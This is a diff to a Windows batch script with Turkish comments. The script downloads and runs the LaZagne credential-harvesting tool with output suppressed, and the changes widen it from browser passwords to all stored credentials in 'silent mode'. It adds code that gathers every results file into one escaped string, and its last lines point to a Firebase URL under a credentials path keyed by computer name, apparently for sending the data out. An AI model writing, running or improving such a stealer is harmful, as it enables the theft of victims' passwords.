@@ -57,11 +57,11 @@ if %ERRORLEVEL% neq 0 (
 :: Step 7: Lazagne indir
 echo [%DATE% %TIME%] Lazagne indiriliyor... >> "%LOGFILE%"
 echo [+] Lazagne indiriliyor...
-curl -L -o lazagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe >nul 2>&1
+curl -L -o lazagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe >nul 2>&1
 if %ERRORLEVEL% neq 0 (
     echo [%DATE% %TIME%] HATA: Curl indirme basarisiz, PowerShell ile deneniyor... >> "%LOGFILE%"
     echo [+] HATA: Curl indirme basarisiz, PowerShell ile deneniyor...
-    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe' -OutFile 'lazagne.exe' } catch { Write-Output ('HATA: PowerShell indirme basarisiz: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
+    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe' -OutFile 'lazagne.exe' } catch { Write-Output ('HATA: PowerShell indirme basarisiz: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
     if %ERRORLEVEL% neq 0 (
         echo [%DATE% %TIME%] HATA: PowerShell indirme de basarisiz! >> "%LOGFILE%"
         echo [+] HATA: Dosya indirilemedi, lutfen internet baglantisini kontrol edin.
@@ -90,10 +90,10 @@ if exist lazagne.exe (
     exit /b 1
 )
 
-:: Step 9: Sifreleri topla
-echo [%DATE% %TIME%] Sifreler toplanıyor... >> "%LOGFILE%"
-echo [+] Sifreler toplanıyor...
-lazagne.exe browsers -oN -output results >nul 2>&1
+:: Step 9: Tum sifreleri topla (silent mode)
+echo [%DATE% %TIME%] Tum sifreler toplanıyor... >> "%LOGFILE%"
+echo [+] Tum sifreler toplanıyor...
+lazagne.exe all -oN -output results >nul 2>&1
 if %ERRORLEVEL% neq 0 (
     echo [%DATE% %TIME%] HATA: lazagne.exe calistirilamadi! >> "%LOGFILE%"
     echo [+] HATA: Sifre toplama basarisiz, lutfen dosyayi kontrol edin.
@@ -122,9 +122,32 @@ if exist "%LOGFILE%" (
     )
     endlocal & set DATA=%DATA%
 ) else (
-    echo [%DATE% %TIME%] HATA: browsers.txt bulunamadi! >> "%LOGFILE%"
-    echo [+] HATA: browsers.txt bulunamadi, NoDataCollected gonderiliyor...
-    set DATA=NoDataCollected
+    echo [%DATE% %TIME%] UYARI: browsers.txt bulunamadi, diger dosyalara bakiliyor... >> "%LOGFILE%"
+    echo [+] UYARI: browsers.txt bulunamadi, diger dosyalara bakiliyor...
+    :: Tum results klasorundeki txt dosyalari birlestir
+    set DATA=
+    setlocal EnableDelayedExpansion
+    for %%F in (results\*.txt) do (
+        echo [%DATE% %TIME%] %%F isleniyor... >> "%LOGFILE%"
+        echo [+] %%F isleniyor...
+        for /f "usebackq delims=" %%A in ("%%F") do (
+            set "line=%%A"
+            set "line=!line:\=\\!"
+            set "line=!line:"=\\\"!"
+            set "line=!line:^|=\\|!"
+            set "line=!line:^&=\\&!"
+            set "line=!line:^^=\\^!"
+            set "line=!line:
+=\\n!"
+            set "DATA=!DATA!!line!\\n"
+        )
+    )
+    endlocal & set DATA=%DATA%
+    if not defined DATA (
+        echo [%DATE% %TIME%] HATA: Hicbir veri dosyasi bulunamadi! >> "%LOGFILE%"
+        echo [+] HATA: Hicbir veri dosyasi bulunamadi, NoDataCollected gonderiliyor...
+        set DATA=NoDataCollected
+    )
 )
 
 :: Firebase URL with /credentials/%COMPUTERNAME%
